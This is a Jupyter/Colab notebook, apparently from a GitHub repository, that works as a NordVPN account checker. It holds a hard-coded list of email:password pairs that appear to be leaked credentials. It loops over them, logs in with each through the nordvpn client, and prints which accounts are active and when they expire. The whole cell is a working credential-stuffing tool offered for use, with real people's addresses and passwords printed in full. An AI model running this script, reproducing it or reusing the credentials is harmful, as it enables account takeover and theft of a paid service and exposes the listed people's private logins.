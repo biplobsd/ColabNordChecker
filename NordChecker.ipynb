{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "NordChecker.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/biplobsd/ColabNordChecker/blob/master/NordChecker.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "dMnsw5KKDT6E",
        "cellView": "code"
      },
      "source": [
        "# Contacts: http://t.me/biplob_sd\n",
        "\n",
        "#_________________________________________________________________________________________________________________________________________#\n",
        "#CREATE THE CONFIG\n",
        "# import your combo file (email:pass)\n",
        "data = r\"\"\"\n",
        "\n",
        "\n",
        "houghtonc@mail.sacredheart.edu:Mydogmax2007\n",
        "m.beling@gmx.net:kakau123\n",
        "chrisdoylee@gmail.com:oscar56789\n",
        "joshharris1313@gmail.com:ministry13\n",
        "xx-alexdu12-xx@hotmail.fr:Banane09\n",
        "ccutanto@gmail.com:makannasi\n",
        "roshchuzi@gmail.com:Ra786110\n",
        "\n",
        "\n",
        "\"\"\".split(\"\\n\")\n",
        "#_________________________________________________________________________________________________________________________________________#\n",
        "\n",
        "import os, re, sys, subprocess; from IPython.display import clear_output; from datetime import datetime\n",
        "if os.path.isfile(\"/usr/bin/nordvpn\") == False:\n",
        "  !wget --directory-prefix /tmp https://repo.nordvpn.com/deb/nordvpn/debian/pool/main/nordvpn-release_1.0.0_all.deb\n",
        "  !sudo apt install -y /tmp/nordvpn-release_1.0.0_all.deb && sudo apt update && sudo apt install nordvpn -y\n",
        "else:\n",
        "  os.system('pkill nordvpn')\n",
        "clear_output(wait=True)\n",
        "!nordvpn logout\n",
        "!systemctl enable nordvpnd\n",
        "!service nordvpn start &\n",
        "clear_output()\n",
        "count = 0\n",
        "unsort = []\n",
        "for line in data:\n",
        "    if not len(line.strip()) == 0 :\n",
        "      count += 1\n",
        "      user , pas = line.strip().split(':') \n",
        "      res , opt  = subprocess.getstatusoutput(f'nordvpn login --username {user} --password {pas}')\n",
        "      data = opt.split('\\n')\n",
        "      data = data[-1].split('Please try again.')\n",
        "      if res == 0:\n",
        "          data = os.popen('nordvpn account').read()\n",
        "          data = data.split('Account Information:')[1]\n",
        "          data = data.split('Email Address: ')[1]\n",
        "          email , data = data.rstrip().split('VPN Service: ')\n",
        "          print(str(count)+'- ' +user+':'+pas+'\\t'+data)\n",
        "          if not data[0] == 'I':\n",
        "            unsort.append({'Account':user+':'+pas,'Expires':str(data)})\n",
        "          os.system('nordvpn logout')\n",
        "      else:\n",
        "          print(str(count)+'- '+user+':'+pas+'\\t'+str(data[0]))\n",
        "      os.system('systemctl enable nordvpnd')\n",
        "      os.system('service nordvpn start')\n",
        "print(\"\\n\\nOnly Active Account: (Sort as Time)\")\n",
        "sort = sorted(\n",
        "    unsort,\n",
        "    key=lambda x: datetime.strptime(re.sub(r\"(st|th|nd|rd)\", \"\", x['Expires']), 'Active (Expires on %b %d, %Y)'), reverse=True)\n",
        "for p in sort:\n",
        "  print(p['Account']+'\\t'+p['Expires'])"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}